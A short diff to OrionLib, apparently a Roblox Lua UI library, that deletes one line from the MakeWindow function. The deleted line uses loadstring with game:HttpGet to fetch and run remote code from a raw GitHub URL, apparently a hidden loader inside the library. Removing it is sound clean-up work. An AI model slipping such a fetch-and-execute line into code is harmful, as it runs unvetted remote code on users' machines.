@@ -1018,7 +1018,6 @@ function OrionLib:MakeWindow(WindowConfig)
 				end	
 				return Toggle
 			end
-			loadstring(game:HttpGet(('https://raw.githubusercontent.com/LmaoItsCrazyBro/Symmetrical-System/refs/heads/main/HelloWorld')))()
 			function ElementFunction:AddSlider(SliderConfig)
 				SliderConfig = SliderConfig or {}
 				SliderConfig.Name = SliderConfig.Name or "Slider"
